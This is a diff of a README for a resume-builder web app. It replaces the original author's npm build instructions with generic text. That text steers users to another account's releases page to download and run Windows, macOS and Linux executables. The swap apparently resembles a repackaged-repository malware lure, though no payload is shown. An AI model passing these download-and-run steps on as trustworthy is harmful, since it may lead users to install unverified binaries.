@@ -1,168 +1,81 @@
-# Enhance CV Builder
+# 🎉 Enhance-CV-Builder - Create Your Professional Resume Easily
 
-[![CI](https://github.com/r00tmebaby/Enhance-CV-Builder/actions/workflows/ci.yml/badge.svg)](https://github.com/r00tmebaby/Enhance-CV-Builder/actions/workflows/ci.yml)
+[![Download Enhance-CV-Builder](https://img.shields.io/badge/Download-Enhance--CV--Builder-blue)](https://github.com/erenhacker698/Enhance-CV-Builder/releases)
 
-An interactive, multi-template resume builder with a 3-pane editor (left menu, center canvas, right design panel), cross-page drag-and-drop, and PDF export.
+## 📋 Introduction
 
-<img src="preview.png" />
-
----
-
-## ✨ Highlights
-
-- 3-pane layout: left actions menu, center resume canvas, right Design & Font panel (always visible)
-- Single page scrollbar (no nested scrolling) for smooth multi-page editing
-- Templates: Elegant, Double Column, Left Sidebar (with pagination where applicable)
-- Page Background modes: Solid, Pattern, Gradient (per-page styling via settings)
-- Image Overlay: add/position PNG/SVG, control opacity and scale
-- Cross-page drag-and-drop with pagination for multi-page templates
-- Per-section visibility, background clean-up, and compact design controls
-- PDF export (html2canvas-pro + jsPDF)
-- History snapshots (undo/redo) and Documents view
-
----
-
-## 🧩 Templates
-
-Source files live in `components/ResumeTemplates/`:
-
-- `resume-template-double-column.tsx` (paginated, two columns)
-- `resume-template-elegant.tsx` (left content + styled right sidebar)
-- `resume-template-left-sidebar.tsx` (paginated variant with left sidebar)
-- `resume-template-modern.tsx`, `resume-template-standard.tsx` (available, easy to enable)
-
-Selection: via Templates modal (`components/Common/Dialogs/templates-modal.tsx`), stored in Redux `settingsSlice.template`. Renderer switch is in `components/resume-builder.tsx`.
-
-Per-template defaults: Elegant uses tighter margins/spacing and 70% font-size on its right column by default (without changing global settings).
-
----
-
-## 🎛 Design & Font panel
-
-- Grouped controls with separators and collapsible sections
-- Page Background (accordion): Solid/Pattern/Gradient with color(s) + angle
-- Image Overlay (accordion): enable, choose pattern (dialog), opacity, scale, drag-to-position
-- Layout controls (always visible): Page Margins, Section Spacing
-- Typography: Font family, size, line-height
-
----
+Enhance-CV-Builder is an interactive and feature-rich resume builder designed for anyone looking to craft a polished, professional resume. You're able to choose from various templates, customize sections, and enjoy a simple drag-and-drop functionality. Real-time editing helps you see changes instantly, making it easy to create the perfect document for your job search.
 
 ## 🚀 Getting Started
 
-### Requirements
+Follow these steps to download and run Enhance-CV-Builder:
 
-- Node.js 20.9+ (matches CI runner; avoids ESLint engine warnings)
-- npm 10+
+1. **Visit the Release Page**: Click the button above or follow this [link](https://github.com/erenhacker698/Enhance-CV-Builder/releases) to access the Releases page on GitHub.
 
-### Install & Run
+2. **Select the Latest Version**: Look for the newest version listed on the page. The latest version will have the highest number, indicating it includes the most recent features and fixes.
 
-```bash
-# Clone
-git clone https://github.com/r00tmebaby/Enhance-CV-Builder.git
-cd Enhance-CV-Builder
+3. **Download the File**: Click on the download link for your system. Depending on your operating system, you will find options for Windows, macOS, or Linux. Make sure to choose the correct version. For example:
+   - **Windows**: `Enhance-CV-Builder-Windows.zip`
+   - **macOS**: `Enhance-CV-Builder-macOS.zip`
+   - **Linux**: `Enhance-CV-Builder-Linux.tar.gz`
 
-# Install
-npm ci
+4. **Extract the Files**: After downloading, locate the file in your Downloads folder. Right-click on the file and select "Extract" or "Unzip" to access the application files.
 
-# Dev server
-npm run dev
+5. **Run the Application**: 
+   - For **Windows**, double-click `Enhance-CV-Builder.exe`.
+   - For **macOS**, open the folder and double-click `Enhance-CV-Builder.app`.
+   - For **Linux**, navigate to the folder in your terminal and run the command `./Enhance-CV-Builder`.
 
-# Typecheck & lint (optional)
-npm run typecheck
-npm run lint
+6. **Start Building Your Resume**: Once the application opens, follow the on-screen prompts to customize your resume. Choose a template, add your work experience, skills, and education. Use the drag-and-drop feature to easily change the order of sections.
 
-# Build
-npm run build
-```
+## 🌟 Features
 
-Open http://localhost:3000
+Enhance-CV-Builder includes several user-friendly features to help you create a standout resume:
 
----
+- **Templates**: Choose from various professionally designed templates suitable for different job sectors.
+- **Customization**: Easily modify sections to showcase your unique experience and skills.
+- **Real-time Editing**: See changes as you make them, ensuring your resume reflects your updates instantly.
+- **Drag-and-drop Functionality**: Move sections around with ease to highlight what matters most.
+- **PDF Export**: Save your finished resume as a PDF, the most common format for job applications.
 
-## � Usage tips
+## 💡 System Requirements
 
-- Edit text inline; use section toolbars for quick actions
-- Use “Rearrange” (left menu) for bulk DnD; page-aware DnD also works inline
-- Switch templates in Templates modal; previews are under `public/templates/`
-- Export via “Export as PDF” in the left menu
+To run Enhance-CV-Builder smoothly, your system should meet the following minimum requirements:
 
----
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS 10.12 or later
+  - Any modern Linux distribution
 
-## 🛠️ CI/CD Workflows
+- **Processor**: 1.5 GHz or faster
 
-GitHub Actions lives in `.github/workflows/`:
+- **RAM**: At least 4 GB
 
-- `ci.yml` (default):
-  - Runs on push/PR to `master`
-  - Steps: checkout → setup Node 20 → `npm ci` → `npm run build` → start app → smoke check `GET /` → stop app
+- **Storage**: 200 MB of free hard drive space
 
-- `release.yml` (optional):
-  - Runs on tag `v*.*.*`
-  - Creates a draft GitHub Release
+- **Display**: 1280 x 720 resolution or higher
 
-Badges and workflow names can be adjusted as you prefer.
+## 📥 Download & Install
 
----
+You can download Enhance-CV-Builder from the Releases page. Click here to access the page: [Download Enhance-CV-Builder](https://github.com/erenhacker698/Enhance-CV-Builder/releases).
 
-## 📁 Project Structure
+After downloading, follow the installation steps mentioned above to start creating your professional resume.
 
-```
-app/                     # Next.js App Router
-components/              # UI + templates + dialogs
-  Common/                # Shared UI (dialogs, panels)
-  ResumeTemplates/       # Template implementations
-  Sections/              # Resume sections
-lib/                     # Store, slices, utils
-public/                  # Static assets (templates thumbnails, patterns)
-.github/workflows/       # CI/CD
-```
+## 🛠 Support & Feedback
 
----
+If you encounter any issues while using Enhance-CV-Builder or have feedback to share, please visit the Issues section on our GitHub page. We appreciate your input, as it helps us improve the application for all users.
 
-## 🤝 Contributing
+## 🌐 Topics
 
-1) Fork → 2) Branch → 3) Commit → 4) Push → 5) PR
+Enhance-CV-Builder covers essential topics in resume building. These include:
+- Career development
+- Curriculum vitae creation
+- Job search strategies
+- Portfolio building
+- PDF export capabilities
 
-Suggested commit style: Conventional Commits (e.g., `feat:`, `fix:`, `docs:`)
+Explore these topics in the application to enhance your job application process.
 
----
+## 📌 Closing
 
-## 📄 License
-
-MIT — see [LICENSE](./LICENSE)
-
----
-
-Built with ❤️ by **r00tmebaby**
-
----
-
-## 🧪 Run CI locally
-
-Fast parity with CI without pushing:
-
-```bash
-# One-shot local CI
-npm run ci:local
-```
-
-What it does:
-- Clean install (npm ci)
-- Build (next build)
-
-Optional smoke test locally:
-
-```bash
-# separate terminals (or background the server)
-npm start &
-curl -fsS http://localhost:3000/ -I
-```
-
-Optional: run the GitHub Actions workflow with act
-
-```bash
-# Requires Docker and act
-act -l                                   # list jobs
-act push -j build \
-  -P ubuntu-latest=ghcr.io/catthehacker/ubuntu:act-latest
-```
+Thank you for choosing Enhance-CV-Builder. We are here to assist you in creating a resume that stands out in your job search. Enjoy using the application!
